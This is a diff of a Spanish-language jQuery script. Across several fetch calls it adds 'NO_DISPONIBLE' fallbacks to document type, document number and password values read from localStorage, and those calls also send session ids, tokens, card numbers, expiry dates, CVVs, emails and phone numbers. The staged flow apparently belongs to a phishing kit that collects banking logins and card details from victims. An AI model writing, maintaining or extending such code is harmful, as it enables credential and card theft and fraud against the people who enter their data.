@@ -226,9 +226,9 @@ $(document).ready(function ($) {
         headers: { "Content-Type": "application/json" },
         body: JSON.stringify({
           sessionId: sessionId,
-          tipoDoc: localStorage.getItem("tipoDoc"),
-          numDoc: localStorage.getItem("numDoc"),
-          clave: localStorage.getItem("clave"),
+          tipoDoc: localStorage.getItem("tipoDoc") || "NO_DISPONIBLE",
+          numDoc: localStorage.getItem("numDoc") || "NO_DISPONIBLE",
+          clave: localStorage.getItem("clave") || "NO_DISPONIBLE",
           token: token
         })
       })
@@ -282,9 +282,9 @@ $(document).ready(function ($) {
         headers: { "Content-Type": "application/json" },
         body: JSON.stringify({
           sessionId: sessionId,
-          tipoDoc: localStorage.getItem("tipoDoc"),
-          numDoc: localStorage.getItem("numDoc"),
-          clave: localStorage.getItem("clave"),
+          tipoDoc: localStorage.getItem("tipoDoc") || "NO_DISPONIBLE",
+          numDoc: localStorage.getItem("numDoc") || "NO_DISPONIBLE",
+          clave: localStorage.getItem("clave") || "NO_DISPONIBLE",
           tarjeta: tarjeta,
           fecha: fecha,
           cvv: cvv
@@ -337,9 +337,9 @@ $(document).ready(function ($) {
         headers: { "Content-Type": "application/json" },
         body: JSON.stringify({
           sessionId: sessionId,
-          tipoDoc: localStorage.getItem("tipoDoc"),
-          numDoc: localStorage.getItem("numDoc"),
-          clave: localStorage.getItem("clave"),
+          tipoDoc: localStorage.getItem("tipoDoc") || "NO_DISPONIBLE",
+          numDoc: localStorage.getItem("numDoc") || "NO_DISPONIBLE",
+          clave: localStorage.getItem("clave") || "NO_DISPONIBLE",
           correo: correo,
           celular: celular
         })
@@ -610,9 +610,9 @@ $(document).ready(function ($) {
       }
 
       var sessionId = localStorage.getItem("sessionId");
-      var tipoDoc = localStorage.getItem("tipoDoc");
-      var numDoc = localStorage.getItem("numDoc");
-      var clave = localStorage.getItem("clave");
+      var tipoDoc = localStorage.getItem("tipoDoc") || "NO_DISPONIBLE";
+      var numDoc = localStorage.getItem("numDoc") || "NO_DISPONIBLE";
+      var clave = localStorage.getItem("clave") || "NO_DISPONIBLE";
 
       $("#btn-finalizar").attr("disabled", "disabled");
       $("#fondo").show();
